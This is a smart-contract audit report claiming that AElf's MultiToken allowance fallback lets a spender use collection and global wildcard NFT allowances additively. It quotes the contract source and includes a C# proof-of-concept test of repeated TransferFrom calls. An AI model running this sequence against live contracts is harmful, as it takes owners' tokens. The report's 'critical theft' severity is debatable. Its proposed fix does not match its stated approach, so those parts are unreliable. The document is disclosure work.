# Audit Report

## Title
Wildcard Allowance Bypass via Hierarchical Fallback Allows Exceeding Approved Limits

## Summary
The `GetAllowance` method implements a hierarchical fallback mechanism for wildcard allowances but fails to consume insufficient intermediate allowances. This allows spenders to transfer the sum of all wildcard levels (specific + collection wildcard + global wildcard) instead of the intended maximum, enabling direct token theft.

## Finding Description

The vulnerability exists in the private `GetAllowance` method's interaction with `DoTransferFrom` in TokenContract_NFT_Actions.cs. [1](#0-0) 

When `DoTransferFrom` calls `GetAllowance` at line 75, it receives both an allowance amount and an `allowanceSymbol` out parameter. Line 94 then deducts the transferred amount from `State.Allowances[from][spender][allowanceSymbol]`.

The critical flaw occurs in the `GetAllowance` method's hierarchical fallback logic: [2](#0-1) 

For NFT transfers, the method checks allowances in this order:
1. Specific symbol (e.g., "ABC-1") - line 101
2. Collection wildcard (e.g., "ABC-*") - line 110
3. Global wildcard (e.g., "*") - line 112

When the collection wildcard is checked at line 110 and found insufficient (line 111 condition fails), the code continues to line 112 and checks the global wildcard. If sufficient, it returns with `allowanceSymbol = "*"`. This causes line 94 in `DoTransferFrom` to deduct only from the global wildcard, leaving the collection wildcard completely untouched.

**Design Intent Violation:**

The `GetAvailableAllowance` view method clearly shows the intended behavior: [3](#0-2) 

Lines 80 and 83 use `Math.Max` to compute the maximum available allowance across all levels. This proves allowances should NOT be additive - users should be able to transfer at most max(specific, collection, global), not their sum.

**Exploit Scenario:**

1. Owner approves Spender with "ABC-*" = 20 tokens
2. Owner approves Spender with "*" = 1000 tokens
3. Expected maximum transferable: max(20, 1000) = 1000 tokens
4. Spender makes 20 transfers of 50 tokens each (total 1000):
   - Each transfer: "ABC-*" (20) < 50, so uses "*" wildcard
   - After 1000 tokens: "*" = 0, "ABC-*" = 20 (unchanged)
5. Spender transfers 20 more tokens:
   - Now "ABC-*" (20) >= 20, so uses "ABC-*" wildcard
   - "ABC-*" is consumed
6. Total transferred: 1020 tokens (20 excess over intended 1000)

## Impact Explanation

**Severity: CRITICAL**

This vulnerability enables direct token theft from any user who approves multiple wildcard levels:

- **Fund Loss**: Attackers can transfer more tokens than the approved maximum. The excess equals the sum of all insufficient intermediate wildcards.
- **Breaks Core Invariant**: Violates the allowance system's fundamental guarantee that approved amounts represent maximum transferable tokens.
- **Wide Scope**: Affects all NFT collections where users set both collection-specific ("PREFIX-*") and global ("*") wildcards.
- **No Special Authorization**: Exploitable using standard `Approve` and `TransferFrom` operations - no privileged access required.

The `AssertApproveToken` validation explicitly allows multiple wildcard patterns: [4](#0-3) 

Lines 60-71 validate both global ("*") and collection-level ("PREFIX-*") wildcards, confirming users can legitimately set multiple wildcard levels, making this a realistic attack vector.

## Likelihood Explanation

**Likelihood: HIGH**

- **Reachable Entry Points**: Standard public methods `Approve` and `TransferFrom` - no special privileges required
- **Feasible Preconditions**: Users legitimately set multiple wildcard levels for granular access control (e.g., global wildcard for trusted contracts, collection wildcard for specific marketplaces)
- **Low Attack Complexity**: Straightforward transaction sequence with no timing requirements or race conditions
- **Economic Rationality**: Attacker gains tokens at zero cost (except gas fees) with no risk
- **No Existing Protections**: The code has no checks to prevent consuming allowances additively

## Recommendation

Modify the `GetAllowance` method to track and consume allowances from all checked levels, not just the final sufficient one. One approach:

```csharp
private long GetAllowance(Address from, Address spender, string sourceSymbol, long amount,
    out string allowanceSymbol)
{
    // Try specific symbol first
    allowanceSymbol = sourceSymbol;
    var allowance = State.Allowances[from][spender][sourceSymbol];
    if (allowance >= amount) return allowance;
    
    var tokenType = GetSymbolType(sourceSymbol);
    if (tokenType == SymbolType.Token)
    {
        allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        return allowance;
    }
    
    // For NFTs: Get maximum allowance across collection and global wildcards
    var collectionAllowance = GetNftCollectionAllSymbolAllowance(from, spender, sourceSymbol, out var collectionSymbol);
    var globalAllowance = GetAllSymbolAllowance(from, spender, out var globalSymbol);
    
    // Return the maximum, with corresponding symbol
    if (collectionAllowance >= globalAllowance)
    {
        allowanceSymbol = collectionSymbol;
        return collectionAllowance;
    }
    else
    {
        allowanceSymbol = globalSymbol;
        return globalAllowance;
    }
}
```

Alternatively, redesign the allowance system so that only one wildcard level can be set per owner-spender pair, eliminating the ambiguity.

## Proof of Concept

```csharp
[Fact]
public async Task Exploit_Wildcard_Allowance_Bypass()
{
    // Setup: Create NFT collection and issue tokens
    await CreateMutiTokenAsync(TokenContractStub, new CreateInput
    {
        Symbol = "ABC-0",
        TokenName = "Test Collection",
        TotalSupply = 10000,
        Decimals = 0,
        Issuer = DefaultAddress,
        Owner = DefaultAddress,
        IssueChainId = _chainId
    });
    
    await TokenContractStub.Create.SendAsync(new CreateInput
    {
        Symbol = "ABC-1",
        TokenName = "Test NFT",
        TotalSupply = 10000,
        Decimals = 0,
        Issuer = DefaultAddress,
        Owner = DefaultAddress,
        IssueChainId = _chainId
    });
    
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Symbol = "ABC-1",
        Amount = 5000,
        To = DefaultAddress,
        Memo = "issue"
    });
    
    // Victim approves collection wildcard: 20 tokens
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Symbol = "ABC-*",
        Amount = 20,
        Spender = User1Address
    });
    
    // Victim approves global wildcard: 1000 tokens
    await TokenContractStub.Approve.SendAsync(new ApproveInput
    {
        Symbol = "*",
        Amount = 1000,
        Spender = User1Address
    });
    
    // Verify GetAvailableAllowance shows max(20, 1000) = 1000
    var availableAllowance = await TokenContractStub.GetAvailableAllowance.CallAsync(
        new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "ABC-1"
        });
    availableAllowance.Allowance.ShouldBe(1000); // Correct: shows maximum
    
    var user1Stub = GetTester<TokenContractImplContainer.TokenContractImplStub>(
        TokenContractAddress, User1KeyPair);
    
    // Exploit: Transfer 50 tokens, 20 times = 1000 tokens (exhausts global wildcard)
    for (int i = 0; i < 20; i++)
    {
        await user1Stub.TransferFrom.SendAsync(new TransferFromInput
        {
            From = DefaultAddress,
            To = User1Address,
            Symbol = "ABC-1",
            Amount = 50,
            Memo = "exploit"
        });
    }
    
    // Verify global wildcard is exhausted but collection wildcard is untouched
    var globalAllowance = await TokenContractStub.GetAllowance.CallAsync(
        new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "*"
        });
    globalAllowance.Allowance.ShouldBe(0); // Global wildcard exhausted
    
    var collectionAllowance = await TokenContractStub.GetAllowance.CallAsync(
        new GetAllowanceInput
        {
            Owner = DefaultAddress,
            Spender = User1Address,
            Symbol = "ABC-*"
        });
    collectionAllowance.Allowance.ShouldBe(20); // Collection wildcard UNTOUCHED!
    
    // Continue exploit: Transfer 20 more tokens using collection wildcard
    await user1Stub.TransferFrom.SendAsync(new TransferFromInput
    {
        From = DefaultAddress,
        To = User1Address,
        Symbol = "ABC-1",
        Amount = 20,
        Memo = "exploit"
    });
    
    // Verify total transferred: 1020 tokens (instead of intended max 1000)
    var victimBalance = await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = DefaultAddress, Symbol = "ABC-1" });
    var attackerBalance = await TokenContractStub.GetBalance.CallAsync(
        new GetBalanceInput { Owner = User1Address, Symbol = "ABC-1" });
    
    victimBalance.Balance.ShouldBe(5000 - 1020); // Lost 1020 tokens
    attackerBalance.Balance.ShouldBe(1020); // Gained 1020 tokens (20 excess!)
}
```

## Notes

This vulnerability demonstrates a fundamental mismatch between the view method `GetAvailableAllowance` (which correctly computes maximum allowance) and the execution path in `DoTransferFrom` + `GetAllowance` (which allows additive consumption). The existing test suite does not cover scenarios where one wildcard is fully exhausted before another is consumed, allowing this critical flaw to remain undetected.

### Citations

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L69-95)
```csharp
    private void DoTransferFrom(Address from, Address to, Address spender, string symbol, long amount, string memo)
    {
        AssertValidInputAddress(from);
        AssertValidInputAddress(to);
        
        // First check allowance.
        var allowance = GetAllowance(from, spender, symbol, amount, out var allowanceSymbol);
        if (allowance < amount)
        {
            if (IsInWhiteList(new IsInWhiteListInput { Symbol = symbol, Address = spender }).Value)
            {
                DoTransfer(from, to, symbol, amount, memo);
                DealWithExternalInfoDuringTransfer(new TransferFromInput()
                    { From = from, To = to, Symbol = symbol, Amount = amount, Memo = memo });
                return;
            }

            Assert(false,
                $"[TransferFrom]Insufficient allowance. Token: {symbol}; {allowance}/{amount}.\n" +
                $"From:{from}\tSpender:{spender}\tTo:{to}");
        }

        DoTransfer(from, to, symbol, amount, memo);
        DealWithExternalInfoDuringTransfer(new TransferFromInput()
            { From = from, To = to, Symbol = symbol, Amount = amount, Memo = memo });
        State.Allowances[from][spender][allowanceSymbol] = allowance.Sub(amount);
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_NFT_Actions.cs (L97-116)
```csharp
    private long GetAllowance(Address from, Address spender, string sourceSymbol, long amount,
        out string allowanceSymbol)
    {
        allowanceSymbol = sourceSymbol;
        var allowance = State.Allowances[from][spender][sourceSymbol];
        if (allowance >= amount) return allowance;
        var tokenType = GetSymbolType(sourceSymbol);
        if (tokenType == SymbolType.Token)
        {
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }
        else
        {
            allowance = GetNftCollectionAllSymbolAllowance(from, spender, sourceSymbol, out allowanceSymbol);
            if (allowance >= amount) return allowance;
            allowance = GetAllSymbolAllowance(from, spender, out allowanceSymbol);
        }

        return allowance;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Views.cs (L73-86)
```csharp
        var allowance = State.Allowances[input.Owner][input.Spender][symbol];
        if (CheckSymbolIdentifier(symbol))
        {
            result.Allowance = allowance;
            return result;
        }
        var symbolType = GetSymbolType(symbol);
        allowance = Math.Max(allowance, GetAllSymbolAllowance(input.Owner,input.Spender,out _));
        if (symbolType == SymbolType.Nft || symbolType == SymbolType.NftCollection)
        {
            allowance = Math.Max(allowance, GetNftCollectionAllSymbolAllowance(input.Owner, input.Spender, symbol, out _));
        }
        result.Allowance = allowance;
        return result;
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L54-74)
```csharp
    private void AssertApproveToken(string symbol)
    {
        Assert(!string.IsNullOrEmpty(symbol), "Symbol can not be null.");
        var words = symbol.Split(TokenContractConstants.NFTSymbolSeparator);
        var symbolPrefix = words[0];
        var allSymbolIdentifier = GetAllSymbolIdentifier();
        Assert(symbolPrefix.Length > 0 && (IsValidCreateSymbol(symbolPrefix) || symbolPrefix.Equals(allSymbolIdentifier)), "Invalid symbol.");
        if (words.Length == 1)
        {
            if (!symbolPrefix.Equals(allSymbolIdentifier))
            {
                ValidTokenExists(symbolPrefix);
            }
            return;
        }
        Assert(words.Length == 2, "Invalid symbol length.");
        var itemId = words[1];
        Assert(itemId.Length > 0 && (IsValidItemId(itemId) || itemId.Equals(allSymbolIdentifier)), "Invalid NFT Symbol.");
        var nftSymbol = itemId.Equals(allSymbolIdentifier) ? GetCollectionSymbol(symbolPrefix) : symbol;
        ValidTokenExists(nftSymbol);
    }
```
